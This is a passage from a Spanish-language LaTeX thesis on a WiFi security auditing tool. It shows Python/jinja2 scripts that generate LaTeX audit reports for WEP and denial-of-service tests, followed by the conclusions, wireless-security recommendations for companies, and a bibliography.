    sleep 20s
    killall xterm
    cd $RUTA_BASE
    ATAQUE_ACABADO="SI"
    echo "FIN" > $ARCHIVO_LOG
}
\end{lstlisting}


\subsection{SECWEP1.py} 
        Este apartado mostrará las cuatro variables básicas de una red WEP. A continuación se observa el archivo \textit{python} para facilitar el entendimiento, se aprecia que se ha empleado la biblioteca \textit{jinja}, mostrando en la linea 17 cual será la estructura que se empleará (Template). En la linea 18 se puede observar la salida con la información ya en el INF-WEP.tex y las  variables que se introducirán.  

\begin{lstlisting}[language=Python,label=informeWEP,caption=Sección WEP.py]
import jinja2
import sys, os
from jinja2 import Template
latex_jinja_env = jinja2.Environment(
    block_start_string = '\BLOCK{',
    block_end_string = '}',
    variable_start_string = '\VAR{',
    variable_end_string = '}',
    comment_start_string = '\#{',
    comment_end_string = '}',
    line_statement_prefix = '%%',
    line_comment_prefix = '%#',
    trim_blocks = True,
    autoescape = False,
    loader = jinja2.FileSystemLoader(os.path.abspath('.'))
)
template = latex_jinja_env.get_template('INFORME/SECWEP1-Template.tex')
output = file('INFORME/INF-WEP.tex', 'w')
output.write(template.render(sbssid=sys.argv[1],sessid=sys.argv[2],scanal=sys.argv[3],sinterfaz=sys.argv[4]).encode("iso-8859-1"))
output.close()
\end{lstlisting}

\subsubsection{SECWEP1-Template.tex}        
\lstinputlisting[language={[LaTeX]TeX},label=informeWEP1,caption=Sección WEP-Template] {SECWEP1-Template.tex.txt}
                
\subsubsection{INF-WEP1.tex}
\lstinputlisting[language={[LaTeX]TeX},label=informeWEP2,caption=Sección WEP.tex] {INF-WEP.tex.txt}
                
\subsection{SUBSDOS.py}
        Este sección, es la encargada de recoger toda la información cuando se realiza el ataque de Denegación de Servicios. Al igual que en el apartado anterior, el programa en \textit{python}  utiliza la biblioteca previamente importada, \textit{jinja2}. Será el mismo procedimiento, llamando al Template para generar el INF-SUBSDOS.tex.
        
        
        Esta sección se utilizará tanto para el protocolo WEP como para el WPA/WPA2.
        
\begin{lstlisting}[language=Python,label=informedds,caption=Sección Denegación de Servicios.py]                
import jinja2
import sys, os
from jinja2 import Template
latex_jinja_env = jinja2.Environment(
    block_start_string = '\BLOCK{',
    block_end_string = '}',
    variable_start_string = '\VAR{',
    variable_end_string = '}',
    comment_start_string = '\#{',
    comment_end_string = '}',
    line_statement_prefix = '%%',
    line_comment_prefix = '%#',
    trim_blocks = True,
    autoescape = False,
    loader = jinja2.FileSystemLoader(os.path.abspath('.'))
)
template = latex_jinja_env.get_template('INFORME/SUBSDOS-Template.tex')
output = file('INFORME/INF-SUBSDOS.tex', 'w')
output.write(template.render(x1=sys.argv[1],x2=sys.argv[2],x3=sys.argv[3],x4=sys.argv[4]).encode("iso-8859-1"))
output.close()
\end{lstlisting}

                                
\subsubsection{SUBSDOS-Template.tex}
                
\lstinputlisting[language={[LaTeX]TeX},
                 label=SUBSDOS-Template.tex,
                 caption=SUBSDOS-Template.tex]{SUBSDOS-Template.tex.txt}
                
\subsubsection{INF-SUBSDOS.tex}
                
\lstinputlisting[language={[LaTeX]TeX},
                 label=INF-SUBSDOS.tex,
                 caption=INF-SUBSDOS.tex] {INF-SUBSDOS.tex.txt}
                
                
\subsection{SUBSWEP1.py}
        Por último, se obtendrá toda la información necesaria a la hora de generar el informe automatizado, tras un ataque a una red con cifrado WEP. Los pasos que se han seguido son exactamente los mismos que las secciones anteriores.
        
\lstinputlisting[language=Python,
                 label=informewp1,
                 caption=Sección WEP1] {SUBSWEP1.py.txt}
                        
\subsubsection{SUBSWEP1-Template.tex}

\lstinputlisting[language={[LaTeX]TeX},
                 label=SUBSWEP1-Template,
                 caption=SUBSWEP1-Template.tex] {SUBSWEP1-Template.tex.txt}
                
                
\subsubsection{INF-SUBSWEP1.tex}

\lstinputlisting[%
  language={[LaTeX]TeX},
  label=INF-SUBWEP1,
  caption=INF-SUBWEP1.tex] {INF-SUBSWEP1.tex.txt}
\paragraph{Generar informe WEP.}                
\lstinputlisting[%
  language={[LaTeX]TeX},
  label=CrearInformeWEP(),
  caption=CrearInformeWEP()] {CrearInformeWEP().txt}

\paragraph{Generar informe WPA.}

\lstinputlisting[%
  language={[LaTeX]TeX},
  label=CrearInformeWPA(),
  caption=CrearInformeWPA()] {CrearInformeWPA().txt}

\begin{figure}[H]
  \centering
   \includegraphics[width=1.2\textwidth]{informeWPA.png}
  \caption{Informe WPA.}
  \label{fig:i}
\end{figure} 

Como en el caso anterior, el informe WPA se puede desglosar en varias secciones que generan un único informe.
Se utilizan los mismo programas y el mismo lenguaje de programación por lo que no se volverá a explicar de nuevo, pudiendo leerlo en el ANEXO C, si fuera necesario.


%%%%%%%%%%%%%%CONCLUSION %%%%%%%%%%


\chapter{Conclusiones y propuestas}

\lettrine[lines=2]{E}{n} la actualidad las redes inalámbricas están sustituyendo a los cables de red. Así la conexión no se limita a la longitud de un cable y se puede extender muchos metros alrededor del punto de acceso. 

Con este proyecto se ha tratado de advertir de los distintos problemas con los que cuentan las redes inalámbricas, así como la seguridad que se les aplica.
Para entender un poco este funcionamiento se ha de tener claro algunos conocimientos básicos que se han explicado a lo largo de la memoria, como las tecnologías WiFi, su distintos modos de funcionamiento y los prácticas necesarias para su buen funcionamiento.

La seguridad en las redes inalámbricas debería ser un objetivo imprescindible para cualquier empresa, dando así la importancia que se merece la seguridad de la información. La motivación de este proyecto, es conseguir concienciar al mayor número posible de empresas, del fácil acceso y las posibles causas económicas e incluso jurídicas que le puede ocasionar un posible ataque. Por ello, la importancia de hacer auditorias de forma periódica.

Como posible estudios futuros, me gustaría seguir desarrollando la aplicación, ampliando el número de ataques y recogiendo mayor información en el informe automático.

\section{Recomendaciones.}
\begin{itemize}
        \item Se debe tener en cuenta el alcance de nuestra red, ya que cuanto menos señal se propague fuera de las instalaciones menor será las posibilidades de que se acceda desde fuera.
        \item Por muy simple que parezca, es importante cambiar los datos de accesos al router que vienen por defecto.(No olvidar cambiar la contraseña) Utilizar contraseñas de al menos 16 caracteres, empleando mayúsculas minúsculas y caracteres especiales. 
        \item Ocultar el nombre de la red (SSID), de forma que no se difunda el nombre de la red.
         \item Se deben usar los protocolos de seguridad, WPA o WPA2. Ya que, el protocolo WEP no nos aporta ningún tipo de seguridad.
        \item Es recomendable que se apague el router o punto de acceso una vez que ya no vaya a utilizarse.
        \item Hacer listas de control de acceso con las direcciones MAC de aquellos dispositivos que quieras que tengan acceso a la red.
        \item Utilizar IP estáticas, deshabilitando el DHCP (asignación dinámica IP) 
        \item Realizar auditorías periódicamente ayudará a prevenir ataques, evitando posibles errores.
        \item Contratar profesionales en la seguridad informática. 
\end{itemize}        
Estas medidas no harán que su red sea invulnerable a cualquier ataque, pues eso es imposible, pero garantizará unos niveles altos de seguridad.

%%Para hacer apendices%%
\appendix

\chapter{Informe WEP}\label{anexo.A}
%\includepdf[pages=-]{informe_WEP}
%\input{informe.tex}
\chapter{Informe WPA}\label{anexo.B}
%\includepdf[pages=-]{informe-WPA}

\chapter{Código}\label{anexo.C}
%\lstinputlisting[label=INF-SUBSDOS.tex,
   %                    caption=INF-SUBSDOS.tex] {SeguridadWifi}
\cleardoublepage
%%BiBLIOGRAFIA%%
%\addcontentsline{toc}{chapter}{Bibliografía}
%\bibliographystyle{acm} % estilo de la bibliografía.
%\bibliography{yyyy} % yyyy.bib es el fichero donde está salvada la bibliografía.

\begin{thebibliography}{X}

\bibitem{ipyme} \textsc{Fundetec y el ONTSI. (2012), Urueña, Alberto., P. Ballestero., María. Valdecasa, Elena.}  \textsc{Recuperado de \url{http://www.ipyme.org/Publicaciones/informe-epyme-2012.pdf}}, \textit{Análisis sectorial de implantación de las TIC en la pyme española.}
España 2012, pag 105.

\bibitem{INTECO} \textsc{INTECO. (2012), Pérez San-José, Pablo(dirección)., Gutérrez, Cristina (coordinación)., Alvarez Alonso,Eduardo., García Pérez,Laura., de la Fuente Rodríguez, Susana .}\textsc{Recuperado de \url{https://www.incibe.es/file/Sp61c9ljOlMT7jcjbxYNVQ}},\textit{ Estudio sobre seguridad de la información y continuidad de negocio en las pymes españolas.}
España, Semptiembre 2012,

\bibitem{SP} \textsc{National Institute of Standards and Techonology (2008), Scarfone, Karen., Souppaya, Murugiah., Cody, Amanda., Orebaugh, Angela  }  \textsc{Recuperado de \url{http://csrc.nist.gov/publications/nistpubs/800-115/SP800-115.pdf}},\textit{Technical Guide to Information Security Testing and Assessment}, 
Estados Unidos, Septiembre 2008.

\bibitem{802.11} \textsc{ccm Benchmark group, Introducción a las redes inalámbricas WiFi (802.11)}  \textsc{Recuperado de \url{http://es.ccm.net/faq/56-curso-de-introduccion-a-las-redes-inalambricas-wi-fi}},

%\bibitem{WEP} \textsc{admin. (2011, Agosto 09). Protocolos de seguridad. Académica cursos libres Web }  \textsc{\url{http://cursoslibres.academica.mx/206/seguridad-en-redes/3-protecciones-y-herramientas-de-seguridad/protocolos-de-seguridad.}}, Figura 1. Algoritmo de Encriptación WEP

\bibitem{backtrack5} \textsc{Ramachandran,Vivek. (2011)}  \textit{BackTrack 5 Wireless Penetration Testing}, Beginner's Guide, Open source.

%\bibitem{offensive security} \textsc{Página oficial offensive security, (2016)}  \textsc{Recuperado de \url{https://www.offensive-security.com/}},

\bibitem{kali} \textsc{González Pérez,Pablo., Sánchez Garecés, Germán., Soriano de la Cámara, Jose Miguel. (2015) } y \textsc{0xWORD}, \textit{Pentesting con kali 2.0}, 
Madrid, España.

\bibitem{Raspberry} \textsc{Moya Fernández, Francisco. (2016)} \textit{Taller de Raspberry.} \textsc{Recuperado de \url{https://www.gitbook.com/book/franciscomoya/taller-de-raspberry-pi/details}}, 3 edición.

%\bibitem{wifi} \textsc{Página oficial de wi-fi alliance. (2016)}  \textsc{Recuperado de \url{http://www.wi-fi.org/}},

\bibitem{IEEE} \textsc{Estándares de asociación del Instituto de Ingeniería Eléctrica y Electrónica.(2016) }  \textsc{Recuperado de \url{http://standards.ieee.org/about/get/802/802.11.html}},

%\bibitem{alfa} \textsc{Tarjeta Inalámbrica, alfa}  \textsc{\url{http://www.tienda-alfanetwork.com/AWUS036NHA-informacion.php}},

%\bibitem{kali1} \textsc{offensive security, Página oficial Kali Linux.(2016)}  \textsc{Recuperado de \url{https://www.kali.org/}},

%\bibitem{kali2} \textsc{offensive security, Página oficial Kali Linux, Instalación del sistema operativo.}  \textsc{Recuperado de \url{http://docs.kali.org/kali-on-arm/install-kali-arm-on-a-beaglebone-black}},

\bibitem{RaspberryPi} \textsc{Robinson, Andrew., Cook, Mike., Evans, Jonathan., McManus, Sean. (Primera edición 2014.)}  \textsc{Teach Yourself Visually}, \textit{Raspberry Pi Projects}, 

\bibitem{GNU} \textsc{Free Software Foundation, El manifesto de GNU.}  \textsc{Recuperado de \url{http://www.gnu.org/gnu/manifesto.html}}, 

\bibitem{TechTarget} \textsc{TechTarget , Búsqueda de la Seguridad.(2016)}  \textsc{Recuperado de \url{http://searchsecurity.techtarget.com/}}, 

%\bibitem{Jinja2} \textsc{Ronacher, Armin. (2008).}\textit{ Lenguaje de plantillas Jinja2.}  \textsc{Recuperado de \url{http://jinja.pocoo.org/docs/dev/}}, 

\bibitem{RaspberryPi.co} \textsc{ G. Bejarano, Mario.Tutoriales de Raspberry Pi (2016)}.\textsc{\url{Recuperado de http://www.frambuesapi.co/tutoriales-raspberry-pi/}}, 

\bibitem{Python1} \textsc{Python SoftwareFoundation, Tutorial Python,. }  \textsc{Recuperado de \url{https://docs.python.org/3/tutorial/index.html}}, 

%\bibitem{elladodelmal} \textsc{Un informático en el lado del mal, Chema Alonso.(2013)}  \textsc{Recuperado de \url{http://www.elladodelmal.com/2013/05/pentesting-by-desing.html}}, 

\bibitem{gliffy} \textsc{Programa empleado para la realización de los gráficos}  \textsc{Recuperado de \url{https://www.gliffy.com}}, 

\end{thebibliography}

\end{document}
